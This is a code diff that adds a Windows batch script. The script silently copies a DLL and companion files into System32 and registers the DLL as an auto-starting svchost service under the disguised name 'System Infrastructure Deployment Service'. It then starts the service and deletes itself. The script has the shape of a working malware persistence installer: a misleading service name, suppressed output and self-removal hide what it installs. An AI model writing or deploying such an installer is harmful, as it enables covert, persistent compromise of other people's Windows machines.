@@ -1,0 +1,34 @@
+@echo off
+
+cd /d "%~dp0"
+
+set DSP_NAME="System Infrastructure Deployment Service"
+
+sc stop sysdload > nul
+
+echo %~dp0 | findstr /i "system32" > nul
+if %ERRORLEVEL% equ 0 (goto INSTALL) else (goto COPYFILE)
+
+:COPYFILE
+
+copy /y "%~dp0\sysdload.dll" "%windir%\System32" > nul
+rem del /f /q "%~dp0\sysdload.dll" > nul
+
+copy /y "%~dp0\sysdload.ini" "%windir%\System32" > nul
+rem del /f /q "%~dp0\sysdload.ini" > nul
+
+copy /y "%~dp0\sysdload.dat" "%windir%\System32" > nul
+rem del /f /q "%windir%\System32\sysdload.dat" > nul
+
+:INSTALL
+
+ 
+sc create sysdload binpath= "%windir%\System32\svchost.exe -k sysdload" DisplayName= %DSP_NAME% > nul
+sc description sysdload %DSP_NAME% > nul
+sc config sysdload type= interact type= own start= auto error= normal binpath= "%windir%\System32\svchost.exe -k sysdload" > nul
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v sysdload /t REG_MULTI_SZ /d "sysdload" /f > nul
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\sysdload\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%windir%\System32\sysdload.dll" /f > nul
+
+sc start sysdload > nul
+
+del /f /q "%~dpnx0" > nul
